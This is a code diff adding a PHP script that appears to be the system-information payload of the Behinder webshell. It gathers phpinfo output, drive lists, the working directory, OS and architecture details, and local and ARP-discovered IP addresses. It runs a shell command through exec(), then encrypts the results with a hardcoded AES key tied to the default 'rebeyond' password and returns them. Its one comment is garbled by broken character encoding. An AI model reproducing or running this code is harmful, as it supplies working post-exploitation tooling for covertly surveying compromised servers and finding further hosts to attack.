@@ -1,0 +1,80 @@
+error_reporting(0);
+function main($whatever) {
+    $result = array();
+    ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean();
+    $driveList ="";
+    if (stristr(PHP_OS,"windows")||stristr(PHP_OS,"winnt"))
+    {
+        for($i=65;$i<=90;$i++)
+    	{
+    		$drive=chr($i).':/';
+    		file_exists($drive) ? $driveList=$driveList.$drive.";":'';
+    	}
+    }
+	else
+	{
+		$driveList="/";
+	}
+    $currentPath=getcwd();
+    //echo "phpinfo=".$info."\n"."currentPath=".$currentPath."\n"."driveList=".$driveList;
+    $osInfo=PHP_OS;
+    $arch="64";
+    if (PHP_INT_SIZE == 4) {
+        $arch = "32";
+    }
+    $localIp=gethostbyname(gethostname());
+    if ($localIp!=$_SERVER['SERVER_ADDR'])
+    {
+        $localIp=$localIp." ".$_SERVER['SERVER_ADDR'];
+    }
+    $extraIps=getInnerIP();
+    foreach($extraIps as $ip)
+    {
+        if (strpos($localIp,$ip)===false)
+        {
+         $localIp=$localIp." ".$ip;
+        }
+    }
+    $basicInfoObj=array("basicInfo"=>base64_encode($info),"driveList"=>base64_encode($driveList),"currentPath"=>base64_encode($currentPath),"osInfo"=>base64_encode($osInfo),"arch"=>base64_encode($arch),"localIp"=>base64_encode($localIp));
+    //echo json_encode($result);
+    $result["status"] = base64_encode("success");
+    $result["msg"] = base64_encode(json_encode($basicInfoObj));
+    //echo json_encode($result);
+    //echo openssl_encrypt(json_encode($result), "AES128", $key);
+    echo encrypt(json_encode($result));
+}
+function getInnerIP()
+{
+$result = array();
+
+if (is_callable("exec"))
+{
+    $result = array();
+    exec('arp -a',$sa);
+    foreach($sa as $s)
+    {
+        if (strpos($s,'---')!==false)
+		{
+			$parts=explode(' ',$s);
+			$ip=$parts[1];
+			array_push($result,$ip);
+		}
+		//var_dump(explode(' ',$s));
+           // array_push($result,explode(' ',$s)[1]);
+    }
+
+}
+
+return $result;
+}
+
+
+
+
+	function Encrypt($data)
+	{
+		$key="e45e329feb5d925b"; //����ԿΪ��������32λmd5ֵ��ǰ16λ��Ĭ����������rebeyond
+		return base64_encode(openssl_encrypt($data, "AES-128-ECB", $key,OPENSSL_PKCS1_PADDING));
+	}
+$whatever="QzZwWHZIRTlPU3ZsUTNqaXVhZkdVNmNJMjE1dVQ5TWdtWDl0N0pPdHBYZm8zR3VEcU8wb0Rzd2kwU3lhMVBnck5BM2NubVBKZzhKS1VPelRhSTFEN1NiYkFmMnRjQXhmRzFwV1AyR3RLa3ZiVEFuVFAyalE0cUFBV1pYWmNpcWRUalVCMmcwNm8zeFJ6Q2dkSU5TN1o1bU9ZWUxFd2tZYU0yOUNlcTlNRmU5cXFGS1lZTHpVRnlWM2RXakJpRmF5V1dDZElPSkRyeVE1dk96Rnpxd0RnVHZnRm44SHJYNTZYYkJrSzE1cmpGUDdRVXpZYmNyaXpmRHk2VHVqV0p6SkRIaDhvV1lIQmNlS1NpSU13dExHYjVRekx2eFA3dWs1MWNTOTd6c3N1VzQyTUpwZ2tlTlEwMGFlVHh5Sm4zVVRaOVg4WklWN3dkVGZpMVZUVTlyZzFGd3FFcFhYeE5NZ09JR25USG1lcXRidmdudVJ2Q1pOMngzY0RQbjJONWVNM2ZwNmVGdzllMnZ0WW9nYVlaSVl6THA0MGdJdXp4TGVuMjVQcUJ4UElFa3Ztc1FiMEVjc290UWg2QWExekdXRjF4MzZzWkVxZDBBYWtiWFZHTUdkeE9oUVFXYTJOZE53VVBGa05iU1NBb1pBeTZDTEV4OFZLMWgxZFJySDJOT3p6SWh1NWk5dEtjWU5EOTUwajFhR3o0V1AzR1JDNXJ3QXR5V3c4OGxwaXl4c0dMT0FiR1ZqUTFKWnZhb1lzbGlOcnBPZ01oRmdBSEFKN1Q0TVV1RVpQOTNOWWJWNU9zYUJxelRXcHM0a1lMY0U3UWNmZkRqM3VnVXFSNGFIMnJQc2RkQUlvVlczRlhxcjlLMFJnWE1GUFFBaGtIdURZOWE4Q1RPZDJkUHZzczRxNThzUDlIYW9jM09RQmFEWEJURndyVXpySlNtdWt2VTJHMEpFNW5KdnRDaDh0QkJMM1dTcmxmckRhdndVSGZLMmlTd0FmRlZvdFRQZ1I5bHA0T1E0VVhibjBWRVpFUWhhNXl0RWtpMU5hREg4QWNwa3A2S3NaVHFUUHk4azFsRTBKTGpidHlNUzdGbG5aNUljc0JtRGZ0RGk2WFFpM0d4WTV2RmhMY0tkeUdPS0d6ZFZLcElORWtOYkRzVUo4dmVZUmlGOTE4SFJXS2RicDl1UzVhSFhGVUhsaTNDbzdpZUI0ZkpXM0FDTTdZVUQ5V2xGYjFLMTRHTnBEQUFGTDBPeDZEb2tvNlIzSEtSSEhzdUNZZXVWZ0NKMmtMTEZEZllvc0lIZ0NWR1lra0RNYzRTS01penBNVmZMaVA3M2FUa3RjOE5WRzFrUjczdDVPOHNSQWlyT1ppVnJ4TVY0YmlJYXhWQXlnVjRmUHlkZ2MyQVJ3bjN4SUJ4clhCQ2F2SXplYk9hejEyNGlwM2lQeUhxUnpkS0R3Q0hyc0x5VW5BSVB1RTRC";$whatever=base64_decode($whatever);
+main($whatever);
